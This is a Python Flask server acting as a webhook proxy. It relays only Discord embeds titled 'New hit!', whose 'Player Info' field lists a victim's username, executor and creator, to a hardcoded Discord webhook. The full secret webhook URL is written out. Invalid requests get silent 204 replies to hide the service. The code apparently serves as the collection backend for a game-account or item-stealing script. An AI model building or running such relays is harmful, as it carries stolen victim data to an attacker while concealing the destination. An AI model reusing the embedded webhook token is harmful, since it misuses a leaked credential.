from flask import Flask, request, jsonify
from flask_cors import CORS
import requests, time, string, random, os

app = Flask(__name__)
CORS(app)

# 🔒 Your hardcoded Discord webhook
REAL_WEBHOOK = "https://discord.com/api/webhooks/1347215407857270804/xJu0x9KyAtq4B3535P9SdaBvN0FVBzaqPfk59_mLcf6PpSfZWkgq0d9GeQK5vmw_8DKx"

webhook_map = {}
ip_registry = {}
LIMIT_SECONDS = 3600  # 1 message per IP per hour

def generate_token(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@app.route("/")
def home():
    return "", 204  # Show absolutely nothing (No Content)

@app.route("/webhook/<token>", methods=["POST"])
def handle_webhook(token):
    if token not in webhook_map:
        return "", 204  # Silent ignore if token is invalid

    client_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    key = f"{token}:{client_ip}"

    # ⛔ Enforce 1 message per IP
    if key in ip_registry:
        return "", 204  # Silent ignore if IP already sent

    data = request.json
    if not data or "embeds" not in data:
        return "", 204  # Silent ignore if no embeds

    # ✅ Validate the embed is "close enough"
    allowed = False
    for embed in data["embeds"]:
        title = embed.get("title", "")
        fields = embed.get("fields", [])
        if (
            "New hit!" in title and
            "recive the stuff" in title.lower()
        ):
            for field in fields:
                value = field.get("value", "")
                if (
                    field.get("name") == "Player Info"
                    and "Username:" in value
                    and "Executor:" in value
                    and "Creator:" in value
                ):
                    allowed = True
                    break

    if not allowed:
        return "", 204  # Silent ignore if content doesn't match

    # ✅ All checks passed, send
    ip_registry[key] = time.time()
    response = requests.post(webhook_map[token], json=data)
    return jsonify({
        "status": "sent",
        "discord_status": response.status_code
    })

if __name__ == "__main__":
    token = "a8dfndf"  # Static token, or use generate_token()
    webhook_map[token] = REAL_WEBHOOK

    print("\n✅ Webhook Proxy is Ready!")
    print(f"Send POST requests to: https://saturnhub.xyz/webhook/{token}\n")

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
